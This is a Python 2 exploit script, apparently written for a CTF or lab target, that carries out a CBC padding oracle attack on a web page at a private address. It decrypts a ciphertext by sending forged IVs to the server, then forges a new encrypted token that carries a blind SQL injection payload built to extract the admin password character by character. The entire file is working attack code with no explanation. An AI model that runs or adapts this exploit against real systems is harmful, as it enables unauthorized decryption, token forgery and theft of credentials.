#!/usr/bin/env python2

import sys
from Crypto.Cipher import *
import binascii
import base64
import requests
import urllib

ENCKEY = '1234567812345678'
URL = 'http://172.16.0.137/messageDetail.php?id='
KOWN_STR = '1'


def main(args):
    ########################################
    # you may config this part by yourself
    d = base64.b64decode(base64.b64decode(
        'b0J6dWF3L2dvanl4L1RkM3ZDbHAvWHdIQUhTOVNKOW1xems2Z0craVJLdEE='))
    iv = d[0:16]
    XIV = iv
    # print hex_s(xor_str("\x0f\x63\x67\x77\x91\x4d\x0c\xf8\x75\x03\xad\x26\xeb\x53\x42\x98", iv))
    # sys.exit(0)
    ciphertext = d[17:]
    plain = KOWN_STR
    plain_want = "-3||ascii(mid((select(admin_pass)from(admin))from(1)for(1)))=97"
    print plain_want
    # you can choose cipher: blowfish/AES/DES/DES3/CAST/ARC2
    cipher = "AES"
    ########################################
    block_size = 8
    if cipher.lower() == "aes":
        block_size = 16
    if len(iv) != block_size:
        print "[-] IV must be " + str(block_size) + " bytes long(the same as block_size)!"
        return False
    print "=== Generate Target Ciphertext ==="
    if not ciphertext:
        print "[-] Encrypt Error!"
        return False
    print "[+] plaintext is: " + plain
    print "[+] iv is: " + hex_s(iv)
    print "[+] ciphertext is: " + hex_s(ciphertext)
    print
    print "=== Start Padding Oracle Decrypt ==="
    print
    print "[+] Choosing Cipher: " + cipher.upper()

    guess = padding_oracle_decrypt(cipher, ciphertext, iv, block_size)

    #guess = True
    if guess:
        print "[+] Guess intermediary value is: " + hex_s(guess["intermediary"])
        print "[+] plaintext = intermediary_value XOR original_IV"
        print "[+] Guess plaintext is: " + guess["plaintext"]
        # sys.exit(0)
        print
        if plain_want:
            print "=== Start Padding Oracle Encrypt ==="
            print "[+] plaintext want to encrypt is: " + plain_want
            print "[+] Choosing Cipher: " + cipher.upper()
            en = padding_oracle_encrypt(
                cipher, ciphertext, plain_want, iv, block_size)
            if en:
                print "[+] Encrypt Success!"
                print "[+] The ciphertext you want is: " + hex_s(en[block_size:])
                print "[+] IV is: " + hex_s(en[:block_size])
                print "[+] Base64 Encode: " + base64.b64encode(base64.b64encode(en[:block_size] + '|' + en[block_size:]))
                print
                print "[+] Test Url: " + URL + base64.b64encode(base64.b64encode(en[:block_size] + '|' + en[block_size:]))
                print

                print "=== Let's verify the custom encrypt result ==="
                print "[+] Decrypt of ciphertext '" + hex_s(en[block_size:]) + "' is:"
                de = decrypt(en[block_size:], en[:block_size], cipher)
                if de == add_PKCS5_padding(plain_want, block_size):
                    print de
                    print "[+] Bingo!"
                else:
                    print "[-] It seems something wrong happened!"
                    return False
        return True
    else:
        return False


def padding_oracle_encrypt(cipher, ciphertext, plaintext, iv, block_size=8):
    # the last block
    guess_cipher = ciphertext[0 - block_size:]
    plaintext = add_PKCS5_padding(plaintext, block_size)
    print "[*] After padding, plaintext becomes to: " + hex_s(plaintext)
    print
    block = len(plaintext)
    iv_nouse = iv  # no use here, in fact we only need intermediary
    # init with the last cipher block
    prev_cipher = ciphertext[0 - block_size:]
    while block > 0:
        # we need the intermediary value
        tmp = padding_oracle_decrypt_block(
            cipher, prev_cipher, iv_nouse, block_size, debug=True)
        # calculate the iv, the iv is the ciphertext of the previous block
        prev_cipher = xor_str(
            plaintext[block - block_size:block], tmp["intermediary"])
        # save result
        print prev_cipher, guess_cipher
        guess_cipher = str(prev_cipher) + str(guess_cipher)
        block = block - block_size
    return guess_cipher


def padding_oracle_decrypt(cipher, ciphertext, iv, block_size=8, debug=True):
    cipher_block = split_cipher_block(ciphertext, block_size)
    if cipher_block:
        result = {}
        result["intermediary"] = ''
        result["plaintext"] = ''
        result2 = {}
        result2["intermediary"] = ''
        result2["plaintext"] = ''
        counter = 0
        for c in cipher_block:
            if debug:
                print "[*] Now try to decrypt block " + str(counter)
                print "[*] Block " + str(counter) + "'s ciphertext is: " + hex_s(c)
                print
            guess = padding_oracle_decrypt_block(
                cipher, c, iv, block_size, debug)
            if guess:
                iv = c
                result["intermediary"] += guess["intermediary"]
                result["plaintext"] += guess["plaintext"]
                if debug:
                    print
                    print "[+] Block " + str(counter) + " decrypt!"
                    print "[+] intermediary value is: " + hex_s(guess["intermediary"])
                    print "[+] The plaintext of block " + str(counter) + " is: " + guess["plaintext"]
                    print
                counter = counter + 1
            else:
                print "[-] padding oracle decrypt error!"
                return False
        return result
    else:
        print "[-] ciphertext's block_size is incorrect!"
        return False


def padding_oracle_decrypt_block(cipher, ciphertext, iv, block_size=8, debug=True):
    result = {}
    plain = ''
    intermediary = []
    iv_p = []
    print
    print block_size
    print
    for i in range(1, block_size + 1):
        iv_try = []
        print i
        iv_p = change_iv(iv_p, intermediary, i)
        for k in range(0, block_size - i):
            iv_try.append("\x00")
        iv_try.append("\x00")
        for b in range(0, 256):
            iv_tmp = iv_try
            iv_tmp[len(iv_tmp) - 1] = chr(b)
            iv_tmp_s = ''.join("%s" % ch for ch in iv_tmp)
            for p in range(0, len(iv_p)):
                iv_tmp_s += iv_p[len(iv_p) - 1 - p]
            if i == 15:
                temp_save = iv_tmp_s
            if i != block_size:
                request_res = decrypt_online(ciphertext, iv_tmp_s, cipher)
                if 'pad' not in request_res.content:
                    # print request_res.content, b
                    print "[*] Try bit: " + str(b)
                    if debug:
                        print "[*] Try IV: " + hex_s(iv_tmp_s)
                        print "[*] Found padding oracle: " + hex_s(plain)
                    iv_p.append(chr(b))
                    intermediary.append(chr(b ^ i))
                    break
            else:
                iv_tmp_s = chr(b) + temp_save[1:]
                request_res = decrypt_online(ciphertext, iv_tmp_s, cipher)
                if 'HumenSec' in request_res.content:
                    # print request_res.content, b
                    print "[*] Try bit: " + str(b)
                    if debug:
                        print "[*] Try IV: " + hex_s(iv_tmp_s)
                        print "[*] Found padding oracle: " + hex_s(plain)
                    iv_p.append(chr(b))
                    intermediary.append(chr(b ^ ord(KOWN_STR)))

    plain = ''
    print len(intermediary)
    print len(iv)
    for ch in range(0, len(intermediary)):
        plain += chr(ord(intermediary[len(intermediary) -
                                      1 - ch]) ^ ord(iv[ch]))
    result["plaintext"] = plain
    result["intermediary"] = ''.join("%s" % ch for ch in intermediary)[::-1]
    return result


def change_iv(iv_p, intermediary, p):
    for i in range(0, len(iv_p)):
        iv_p[i] = chr(ord(intermediary[i]) ^ p)
    return iv_p


def split_cipher_block(ciphertext, block_size=8):
    if len(ciphertext) % block_size != 0:
        return False
    result = []
    length = 0
    while length < len(ciphertext):
        result.append(ciphertext[length:length + block_size])
        length += block_size
    return result


def check_PKCS5_padding(plain, p):
    if len(plain) % 8 != 0:
        return False
    plain = plain[::-1]
    ch = 0
    found = 0
    while ch < p:
        if plain[ch] == chr(p):
            found += 1
        ch += 1
    if found == p:
        return True
    else:
        return False


def add_PKCS5_padding(plaintext, block_size):
    s = ''
    if len(plaintext) % block_size == 0:
        return plaintext
    if len(plaintext) < block_size:
        padding = block_size - len(plaintext)
    else:
        padding = block_size - (len(plaintext) % block_size)

    for i in range(0, padding):
        plaintext += chr(padding)
    return plaintext


def decrypt(ciphertext, iv, cipher):
    key = ENCKEY
    if cipher.lower() == "des":
        o = DES.new(key, DES.MODE_CBC, iv)
    elif cipher.lower() == "aes":
        o = AES.new(key, AES.MODE_CBC, iv)
    elif cipher.lower() == "des3":
        o = DES3.new(key, DES3.MODE_CBC, iv)
    elif cipher.lower() == "blowfish":
        o = Blowfish.new(key, Blowfish.MODE_CBC, iv)
    elif cipher.lower() == "cast":
        o = CAST.new(key, CAST.MODE_CBC, iv)
    elif cipher.lower() == "arc2":
        o = ARC2.new(key, ARC2.MODE_CBC, iv)
    else:
        return False
    if len(iv) % 8 != 0:
        return False
    if len(ciphertext) % 8 != 0:
        return False
    return o.decrypt(ciphertext)


def encrypt(plaintext, iv, cipher):
    key = ENCKEY
    if cipher.lower() == "des":
        if len(key) != 8:
            print "[-] DES key must be 8 bytes long!"
            return False
        o = DES.new(key, DES.MODE_CBC, iv)
    elif cipher.lower() == "aes":
        if len(key) != 16 and len(key) != 24 and len(key) != 32:
            print "[-] AES key must be 16/24/32 bytes long!"
            return False
        o = AES.new(key, AES.MODE_CBC, iv)
    elif cipher.lower() == "des3":
        if len(key) != 16:
            print "[-] Triple DES key must be 16 bytes long!"
            return False
        o = DES3.new(key, DES3.MODE_CBC, iv)
    elif cipher.lower() == "blowfish":
        o = Blowfish.new(key, Blowfish.MODE_CBC, iv)
    elif cipher.lower() == "cast":
        o = CAST.new(key, CAST.MODE_CBC, iv)
    elif cipher.lower() == "arc2":
        o = ARC2.new(key, ARC2.MODE_CBC, iv)
    else:
        return False
    plaintext = add_PKCS5_padding(plaintext, len(iv))
    return o.encrypt(plaintext)


def xor_str(a, b):
    if len(a) != len(b):
        print "[*] xor_str len error"
        return False
    c = ''
    for i in range(0, len(a)):
        c += chr(ord(a[i]) ^ ord(b[i]))
    return c


def hex_s(str):
    re = ''
    for i in range(0, len(str)):
        re += "\\x" + binascii.b2a_hex(str[i])
    return re


def decrypt_online(ciphertext, iv, cipher):
    c = base64.b64encode(base64.b64encode(iv + '|' + ciphertext))
    url_ = URL + c
    try:
        r = requests.get(url_)
    except:
        print 'Error'
        r = {}
        r['content'] = 'HumenSec'
    return r


def hex2str(h):
    c = ''
    h = h.split('\\x')[1:]
    for char_ in h:
        c += binascii.a2b_hex(char_)
    print base64.b64encode(base64.b64encode(c))

if __name__ == "__main__":
    main(sys.argv)
